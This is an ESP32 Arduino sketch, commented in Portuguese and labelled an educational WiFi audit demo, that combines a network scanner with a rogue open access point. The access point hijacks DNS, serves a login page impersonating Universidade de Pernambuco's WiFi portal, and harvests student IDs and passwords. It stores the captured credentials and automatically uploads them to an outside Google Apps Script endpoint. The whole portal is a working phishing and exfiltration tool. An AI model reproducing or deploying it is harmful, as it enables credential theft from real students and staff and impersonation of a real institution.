#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <ArduinoJson.h>
#include <HTTPClient.h>

// Configurações do servidor web
WebServer server(80);
DNSServer dnsServer;

// Configurações do portal captivo
const char* captivePortalSSID = "UPE_Fake_WiFi";
const char* captivePortalPassword = "";

// Estrutura para armazenar informações das redes
struct NetworkInfo {
  String ssid;
  int rssi;
  String bssid;
  int channel;
  String encryption;
};

// Array para armazenar redes encontradas
NetworkInfo networks[50];
int networkCount = 0;

// Modo de operação
enum OperationMode {
  SCANNER_MODE,
  CAPTIVE_PORTAL_MODE
};

OperationMode currentMode = SCANNER_MODE;
unsigned long lastScan = 0;
const unsigned long scanInterval = 10000; // 10 segundos

// Configuração do Google Apps Script
const char* googleScriptURL = "";

// Configurações WiFi para conectar à internet
const char* wifiSSID = "";
const char* wifiPassword = "";

// Estrutura para dados capturados
struct CapturedData {
  String username;
  String password;
  String ip;
  unsigned long timestamp;
};

// Array para armazenar dados localmente - AUMENTADO
CapturedData capturedCredentials[200]; // Aumentado de 100 para 200
int credentialCount = 0;

// Declarações de função
void printMenu();
void handleSerialCommands();
void startScannerMode();
void handleScannerMode();
void scanNetworks();
void startCaptivePortalMode();
void handleCaptivePortalMode();
void handleRoot();
void handleLogin();
void handleNotFound();
void handleCaptivePortalResponse();
void showFoundNetworks();
void performSecurityAnalysis();
void sendToGoogleSheets(String username, String password, String ip);
void saveCredentialsLocally(String username, String password, String ip);
void showStoredCredentials();
void connectToWiFiAndSync();
void autoSyncCheck();

void setup() {
  Serial.begin(115200);
  delay(1000);
  

  
  Serial.println();
  Serial.println("=== ESP32 AM032 WiFi Security Audit Demo ===");
  Serial.println("APENAS PARA FINS EDUCATIVOS!");
  Serial.println();
  
  // Configura o modo WiFi
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  Serial.println("Sistema iniciado com sucesso!");
  Serial.printf("Capacidade: %d credenciais em RAM\n", 200);
  
  // Menu inicial
  printMenu();
  
  // Inicia no modo scanner
  startScannerMode();
}

void loop() {
  switch(currentMode) {
    case SCANNER_MODE:
      handleScannerMode();
      break;
      
    case CAPTIVE_PORTAL_MODE:
      handleCaptivePortalMode();
      break;
  }
  
  // Verifica comandos seriais
  handleSerialCommands();
  
  // Verifica se precisa sincronizar automaticamente
  autoSyncCheck();
  
  delay(100);
}

void printMenu() {
  Serial.println("Comandos disponíveis:");
  Serial.println("1 - Modo Scanner de Redes");
  Serial.println("2 - Portal Captivo Demo");
  Serial.println("3 - Mostrar redes encontradas");
  Serial.println("4 - Análise de segurança");
  Serial.println("5 - Mostrar credenciais capturadas");
  Serial.println("6 - Conectar WiFi e sincronizar dados");
  Serial.println("h - Mostrar este menu");
  Serial.println();
}

void handleSerialCommands() {
  if (Serial.available()) {
    char command = Serial.read();
    
    switch(command) {
      case '1':
        startScannerMode();
        break;
        
      case '2':
        startCaptivePortalMode();
        break;
        
      case '3':
        showFoundNetworks();
        break;
        
      case '4':
        performSecurityAnalysis();
        break;
        
      case '5':
        showStoredCredentials();
        break;
        
      case '6':
        connectToWiFiAndSync();
        break;
        
      case 'h':
        printMenu();
        break;
    }
  }
}

void startScannerMode() {
  Serial.println("Iniciando modo Scanner de Redes...");
  currentMode = SCANNER_MODE;
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
}

void handleScannerMode() {
  if (millis() - lastScan > scanInterval) {
    Serial.println("Escaneando redes WiFi...");
    scanNetworks();
    lastScan = millis();
  }
}

void scanNetworks() {
  int n = WiFi.scanNetworks();
  networkCount = 0;
  
  if (n == 0) {
    Serial.println("Nenhuma rede encontrada");
  } else {
    Serial.printf("Encontradas %d redes:\n", n);
    Serial.println("ID | SSID                     | RSSI | CH | Segurança");
    Serial.println("---|--------------------------|------|----|-----------");
    
    for (int i = 0; i < n && networkCount < 50; ++i) {
      networks[networkCount].ssid = WiFi.SSID(i);
      networks[networkCount].rssi = WiFi.RSSI(i);
      networks[networkCount].bssid = WiFi.BSSIDstr(i);
      networks[networkCount].channel = WiFi.channel(i);
      
      // Determina o tipo de encriptação
      wifi_auth_mode_t encType = WiFi.encryptionType(i);
      switch(encType) {
        case WIFI_AUTH_OPEN:
          networks[networkCount].encryption = "ABERTA";
          break;
        case WIFI_AUTH_WEP:
          networks[networkCount].encryption = "WEP";
          break;
        case WIFI_AUTH_WPA_PSK:
          networks[networkCount].encryption = "WPA";
          break;
        case WIFI_AUTH_WPA2_PSK:
          networks[networkCount].encryption = "WPA2";
          break;
        case WIFI_AUTH_WPA_WPA2_PSK:
          networks[networkCount].encryption = "WPA/WPA2";
          break;
        case WIFI_AUTH_WPA2_ENTERPRISE:
          networks[networkCount].encryption = "WPA2 Enterprise";
          break;
        case WIFI_AUTH_WPA3_PSK:
          networks[networkCount].encryption = "WPA3";
          break;
        default:
          networks[networkCount].encryption = "DESCONHECIDA";
      }
      
      Serial.printf("%2d | %-24s | %4d | %2d | %s\n", 
                   i+1, 
                   networks[networkCount].ssid.c_str(),
                   networks[networkCount].rssi,
                   networks[networkCount].channel,
                   networks[networkCount].encryption.c_str());
      
      networkCount++;
    }
    Serial.println();
  }
  
  WiFi.scanDelete();
}

void startCaptivePortalMode() {
  Serial.println("Iniciando Portal Captivo Demo...");
  Serial.println("ATENÇÃO: Use apenas para demonstração educativa!");
  
  currentMode = CAPTIVE_PORTAL_MODE;
  
  // Para o servidor atual se estiver rodando
  server.stop();
  
  // Configura como Access Point
  WiFi.mode(WIFI_AP);
  WiFi.softAP(captivePortalSSID, captivePortalPassword);
  
  // Aguarda um pouco para o AP estabilizar
  delay(500);
  
  IPAddress apIP = WiFi.softAPIP();
  
  // Configura o servidor DNS para capturar TODOS os domínios
  dnsServer.stop();
  dnsServer.start(53, "*", apIP);
  
  // Configura as rotas do servidor web
  server.on("/", HTTP_GET, handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/login", HTTP_GET, handleRoot);  // Redireciona GET para root
  
  // Rotas comuns para detecção de portal captivo
  server.on("/generate_204", HTTP_GET, handleCaptivePortalResponse);  // Android
  server.on("/gen_204", HTTP_GET, handleCaptivePortalResponse);       // Android alternativo
  server.on("/fwlink", HTTP_GET, handleRoot);                        // Microsoft
  server.on("/hotspot-detect.html", HTTP_GET, handleRoot);           // Apple iOS
  server.on("/connectivity-check.html", HTTP_GET, handleCaptivePortalResponse); // Android
  server.on("/check_network_status.txt", HTTP_GET, handleCaptivePortalResponse); // Android
  server.on("/ncsi.txt", HTTP_GET, handleCaptivePortalResponse);      // Microsoft
  server.on("/success.txt", HTTP_GET, handleCaptivePortalResponse);   // Ubuntu
  
  // Captura todas as outras requisições
  server.onNotFound(handleNotFound);
  
  server.begin();
  
  Serial.print("Portal Captivo iniciado em: ");
  Serial.println(apIP);
  Serial.println("SSID: " + String(captivePortalSSID));
  Serial.println("DNS Server configurado para capturar todos os domínios");
}

void handleCaptivePortalMode() {
  dnsServer.processNextRequest();
  server.handleClient();
}

void handleRoot() {
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Portal UPE - Acesso WiFi</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<meta charset='UTF-8'>";
  html += "<style>";
  html += "body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#1e3c72,#2a5298);margin:0;padding:20px;min-height:100vh;}";
  html += ".container{max-width:400px;margin:50px auto;background:white;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,0.3);overflow:hidden;}";
  html += ".header{background:#1e3c72;color:white;text-align:center;padding:20px;}";
  html += ".logo{width:120px;height:60px;margin:0 auto 15px;display:block;}";
  html += ".content{padding:30px;}";
  html += "h1{margin:0;font-size:18px;font-weight:normal;}";
  html += "h2{color:#1e3c72;margin-bottom:20px;text-align:center;}";
  html += "p{color:#666;text-align:center;margin-bottom:25px;}";
  html += "input{width:100%;padding:12px;margin:8px 0;border:2px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box;}";
  html += "input:focus{border-color:#1e3c72;outline:none;}";
  html += "button{width:100%;padding:12px;background:#1e3c72;color:white;border:none;border-radius:8px;cursor:pointer;font-size:16px;margin-top:10px;}";
  html += "button:hover{background:#2a5298;}";
  html += ".footer{text-align:center;padding:20px;color:#999;font-size:12px;}";
  html += "</style></head><body>";
  html += "<div class='container'>";
  html += "<div class='header'>";
  html += "<svg class='logo' viewBox='0 0 120 60' xmlns='http://www.w3.org/2000/svg'>";
  html += "<defs><linearGradient id='redGrad' x1='0%' y1='0%' x2='100%' y2='100%'>";
  html += "<stop offset='0%' stop-color='#E53E3E'/><stop offset='100%' stop-color='#C53030'/></linearGradient></defs>";
  html += "<rect x='5' y='10' width='35' height='40' rx='4' fill='url(#redGrad)' transform='skewX(-15)'/>";
  html += "<rect x='25' y='10' width='35' height='40' rx='4' fill='url(#redGrad)' transform='skewX(-15)'/>";
  html += "<text x='65' y='25' font-family='Arial Black' font-size='16' font-weight='bold' fill='white'>UPE</text>";
  html += "<rect x='65' y='30' width='8' height='20' fill='white'/>";
  html += "<rect x='75' y='30' width='20' height='8' fill='white'/>";
  html += "<rect x='75' y='42' width='20' height='8' fill='white'/>";
  html += "<rect x='97' y='30' width='20' height='8' fill='white'/>";
  html += "<rect x='97' y='38' width='12' height='4' fill='white'/>";
  html += "<rect x='97' y='42' width='20' height='8' fill='white'/>";
  html += "</svg>";
  html += "<h1>Universidade de Pernambuco</h1>";
  html += "</div>";
  html += "<div class='content'>";
  html += "<h2>Acesso à Rede WiFi Acadêmica</h2>";
  html += "<p>Para acessar a internet, faça login com suas credenciais institucionais UPE.</p>";
  html += "<form action='/login' method='POST'>";
  html += "<input type='text' name='username' placeholder='Matrícula ou CPF' required>";
  html += "<input type='password' name='password' placeholder='Senha' required>";
  html += "<button type='submit'>Conectar</button>";
  html += "</form>";
  html += "</div>";
  html += "<div class='footer'>";
  html += "<p>Sistema de Autenticação WiFi UPE<br>Suporte: ti@upe.br</p>";
  html += "</div>";
  html += "</div></body></html>";
  
  server.send(200, "text/html", html);
}

void handleLogin() {
  String username = server.arg("username");
  String password = server.arg("password");
  String clientIP = server.client().remoteIP().toString();
  
  // Log das credenciais (apenas para demonstração educativa)
  Serial.println("=== CREDENCIAIS CAPTURADAS (DEMO) ===");
  Serial.println("Username: " + username);
  Serial.println("Password: " + password);
  Serial.println("IP do cliente: " + clientIP);
  Serial.println("=====================================");
  
  // Salvar localmente primeiro
  saveCredentialsLocally(username, password, clientIP);
  
  // Enviar para Google Sheets
  sendToGoogleSheets(username, password, clientIP);
  
  // Resposta simulando erro de autenticação
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Portal UPE - Erro de Autenticação</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<meta charset='UTF-8'>";
  html += "<style>";
  html += "body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#1e3c72,#2a5298);margin:0;padding:20px;min-height:100vh;}";
  html += ".container{max-width:400px;margin:50px auto;background:white;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,0.3);overflow:hidden;}";
  html += ".header{background:#d32f2f;color:white;text-align:center;padding:20px;}";
  html += ".content{padding:30px;text-align:center;}";
  html += "h1{margin:0;font-size:18px;font-weight:normal;}";
  html += "h2{color:#d32f2f;margin-bottom:20px;}";
  html += "p{color:#666;margin-bottom:20px;}";
  html += "a{color:#1e3c72;text-decoration:none;font-weight:bold;}";
  html += "a:hover{text-decoration:underline;}";
  html += ".footer{text-align:center;padding:20px;color:#999;font-size:12px;}";
  html += "</style></head><body>";
  html += "<div class='container'>";
  html += "<div class='header'>";
  html += "<h1>❌ Falha na Autenticação</h1>";
  html += "</div>";
  html += "<div class='content'>";
  html += "<h2>Credenciais Inválidas</h2>";
  html += "<p>Verifique sua matrícula/CPF e senha e tente novamente.</p>";
  html += "<p>Se o problema persistir, entre em contato com o suporte técnico.</p>";
  html += "<p><a href='/'>← Voltar ao Login</a></p>";
  html += "</div>";
  html += "<div class='footer'>";
  html += "<p>Sistema de Autenticação WiFi UPE<br>Suporte: ti@upe.br</p>";
  html += "</div>";
  html += "</div></body></html>";
  
  server.send(200, "text/html", html);
}

void handleCaptivePortalResponse() {
  Serial.println("Detectada verificação de conectividade - redirecionando para portal");
  
  // Para Android e outros sistemas que esperam código 204
  String html = "<!DOCTYPE html><html><head>";
  html += "<meta http-equiv='refresh' content='0; url=http://";
  html += WiFi.softAPIP().toString();
  html += "/'>";
  html += "<script>window.location.href='http://";
  html += WiFi.softAPIP().toString();
  html += "/';</script>";
  html += "</head><body>";
  html += "<p>Redirecionando para portal de login...</p>";
  html += "<a href='http://";
  html += WiFi.softAPIP().toString();
  html += "/'>Clique aqui se não for redirecionado automaticamente</a>";
  html += "</body></html>";
  
  server.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/", true);
  server.send(302, "text/html", html);
}

void handleNotFound() {
  // Log da requisição para debug
  String uri = server.uri();
  String method = (server.method() == HTTP_GET) ? "GET" : "POST";
  String host = server.hostHeader();
  
  Serial.println("=== REQUISIÇÃO CAPTURADA ===");
  Serial.println("  Host: " + host);
  Serial.println("  Método: " + method);
  Serial.println("  URI: " + uri);
  Serial.println("  IP Cliente: " + server.client().remoteIP().toString());
  Serial.println("============================");
  
  // Se não for uma requisição para nosso IP, force redirecionamento
  if (host != WiFi.softAPIP().toString()) {
    Serial.println("Redirecionando requisição externa para portal captivo");
    
    String html = "<!DOCTYPE html><html><head>";
    html += "<meta http-equiv='refresh' content='0; url=http://";
    html += WiFi.softAPIP().toString();
    html += "/'>";
    html += "<script>";
    html += "setTimeout(function(){";
    html += "window.location.href='http://";
    html += WiFi.softAPIP().toString();
    html += "/';";
    html += "}, 100);";
    html += "</script>";
    html += "</head><body>";
    html += "<h2>Redirecionando...</h2>";
    html += "<p>Você será redirecionado para o portal de login.</p>";
    html += "<p><a href='http://";
    html += WiFi.softAPIP().toString();
    html += "/'>Clique aqui se não for redirecionado</a></p>";
    html += "</body></html>";
    
    server.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/", true);
    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    server.sendHeader("Pragma", "no-cache");
    server.sendHeader("Expires", "-1");
    server.send(302, "text/html", html);
  } else {
    // Se for para nosso IP mas rota não encontrada, vai para root
    handleRoot();
  }
}

void showFoundNetworks() {
  Serial.println("\n=== REDES ENCONTRADAS ===");
  if (networkCount == 0) {
    Serial.println("Nenhuma rede foi escaneada ainda. Use o comando '1' para escanear.");
    return;
  }
  
  for (int i = 0; i < networkCount; i++) {
    Serial.printf("Rede %d:\n", i+1);
    Serial.printf("  SSID: %s\n", networks[i].ssid.c_str());
    Serial.printf("  BSSID: %s\n", networks[i].bssid.c_str());
    Serial.printf("  RSSI: %d dBm\n", networks[i].rssi);
    Serial.printf("  Canal: %d\n", networks[i].channel);
    Serial.printf("  Segurança: %s\n", networks[i].encryption.c_str());
    Serial.println();
  }
}

void performSecurityAnalysis() {
  Serial.println("\n=== ANÁLISE DE SEGURANÇA ===");
  
  if (networkCount == 0) {
    Serial.println("Nenhuma rede para analisar. Execute um scan primeiro.");
    return;
  }
  
  int openNetworks = 0;
  int wepNetworks = 0;
  int wpaNetworks = 0;
  int wpa2Networks = 0;
  int wpa3Networks = 0;
  int strongSignals = 0;
  
  for (int i = 0; i < networkCount; i++) {
    if (networks[i].encryption == "ABERTA") openNetworks++;
    else if (networks[i].encryption == "WEP") wepNetworks++;
    else if (networks[i].encryption == "WPA") wpaNetworks++;
    else if (networks[i].encryption == "WPA2" || networks[i].encryption == "WPA/WPA2") wpa2Networks++;
    else if (networks[i].encryption == "WPA3") wpa3Networks++;
    
    if (networks[i].rssi > -50) strongSignals++;
  }
  
  Serial.printf("Total de redes analisadas: %d\n", networkCount);
  Serial.printf("Redes abertas (VULNERÁVEL): %d\n", openNetworks);
  Serial.printf("Redes WEP (VULNERÁVEL): %d\n", wepNetworks);
  Serial.printf("Redes WPA (FRACA): %d\n", wpaNetworks);
  Serial.printf("Redes WPA2 (BOA): %d\n", wpa2Networks);
  Serial.printf("Redes WPA3 (EXCELENTE): %d\n", wpa3Networks);
  Serial.printf("Sinais fortes (>-50dBm): %d\n", strongSignals);
  
  Serial.println("\nRecomendações de segurança:");
  if (openNetworks > 0) {
    Serial.println("- Redes abertas detectadas! Configure senha WPA2/WPA3");
  }
  if (wepNetworks > 0) {
    Serial.println("- Redes WEP detectadas! Atualize para WPA2/WPA3");
  }
  if (wpaNetworks > 0) {
    Serial.println("- Redes WPA detectadas! Atualize para WPA2/WPA3");
  }
  
  Serial.println("- Use senhas fortes (>12 caracteres)");
  Serial.println("- Ative WPS desabilitado");
  Serial.println("- Use WPA3 quando disponível");
  Serial.println("- Considere ocultar SSID para redes sensíveis");
}

void saveCredentialsLocally(String username, String password, String ip) {
  if (credentialCount < 200) {
    capturedCredentials[credentialCount].username = username;
    capturedCredentials[credentialCount].password = password;
    capturedCredentials[credentialCount].ip = ip;
    capturedCredentials[credentialCount].timestamp = millis();
    credentialCount++;
    
    Serial.println("Credenciais salvas localmente. Total: " + String(credentialCount));
    Serial.printf("Uso de memória estimado: %d KB\n", (credentialCount * 100) / 1024);
    
    // Auto-sincronizar a cada 50 credenciais
    if (credentialCount % 50 == 0) {
      Serial.println("Limite de 50 credenciais atingido. Tentando sincronização automática...");
      connectToWiFiAndSync();
    }
  } else {
    Serial.println("Limite de armazenamento atingido!");
    Serial.println("Tentando sincronização automática...");
    connectToWiFiAndSync();
  }
}

void showStoredCredentials() {
  Serial.println("\n=== CREDENCIAIS ARMAZENADAS ===");
  if (credentialCount == 0) {
    Serial.println("Nenhuma credencial armazenada.");
    return;
  }
  
  for (int i = 0; i < credentialCount; i++) {
    Serial.printf("Entrada %d:\n", i + 1);
    Serial.printf("  Username: %s\n", capturedCredentials[i].username.c_str());
    Serial.printf("  Password: %s\n", capturedCredentials[i].password.c_str());
    Serial.printf("  IP: %s\n", capturedCredentials[i].ip.c_str());
    Serial.printf("  Timestamp: %lu\n", capturedCredentials[i].timestamp);
    Serial.println();
  }
}

void connectToWiFiAndSync() {
  if (credentialCount == 0) {
    Serial.println("Nenhuma credencial para sincronizar.");
    return;
  }
  
  Serial.println("Conectando ao WiFi...");
  WiFi.mode(WIFI_STA);
  WiFi.begin(wifiSSID, wifiPassword);
  
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    delay(500);
    Serial.print(".");
    attempts++;
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\nConectado ao WiFi!");
    Serial.println("IP: " + WiFi.localIP().toString());
    
    // Sincronizar dados armazenados
    Serial.println("Sincronizando " + String(credentialCount) + " credenciais com Google Sheets...");
    int successCount = 0;
    
    for (int i = 0; i < credentialCount; i++) {
      Serial.printf("Enviando credencial %d/%d...\n", i+1, credentialCount);
      
      HTTPClient http;
      http.begin(googleScriptURL);
      http.addHeader("Content-Type", "application/json");
      
      DynamicJsonDocument doc(1024);
      doc["username"] = capturedCredentials[i].username;
      doc["password"] = capturedCredentials[i].password;
      doc["ip"] = capturedCredentials[i].ip;
      doc["timestamp"] = capturedCredentials[i].timestamp;
      
      String jsonString;
      serializeJson(doc, jsonString);
      
      int httpResponseCode = http.POST(jsonString);
      
      if (httpResponseCode > 0) {
        successCount++;
        Serial.printf("✓ Credencial %d enviada com sucesso\n", i+1);
      } else {
        Serial.printf("✗ Erro ao enviar credencial %d: %d\n", i+1, httpResponseCode);
      }
      
      http.end();
      delay(1000); // Evitar spam
    }
    
    Serial.printf("Sincronização concluída! %d/%d credenciais enviadas.\n", successCount, credentialCount);
    
    // Limpar dados locais após sincronização
    if (successCount == credentialCount) {
      credentialCount = 0;
      Serial.println("Memória RAM liberada com sucesso!");
    } else {
      Serial.println("Algumas credenciais falharam. Mantendo dados na memória.");
    }
    
  } else {
    Serial.println("\nFalha ao conectar ao WiFi!");
    Serial.println("Credenciais mantidas na memória para próxima tentativa.");
  }
  
  // Voltar ao modo AP se estava no portal captivo
  if (currentMode == CAPTIVE_PORTAL_MODE) {
    Serial.println("Retornando ao modo Portal Captivo...");
    delay(2000);
    startCaptivePortalMode();
  }
}

void autoSyncCheck() {
  static unsigned long lastAutoSync = 0;
  const unsigned long autoSyncInterval = 300000; // 5 minutos
  
  // Verifica a cada 5 minutos se há credenciais para sincronizar
  if (millis() - lastAutoSync > autoSyncInterval && credentialCount > 0) {
    Serial.println("Verificação automática: tentando sincronizar dados...");
    connectToWiFiAndSync();
    lastAutoSync = millis();
  }
}

void sendToGoogleSheets(String username, String password, String ip) {
  // Esta função agora é chamada apenas durante a sincronização manual
  Serial.println("Use comando '6' para sincronizar ou aguarde sincronização automática");
}
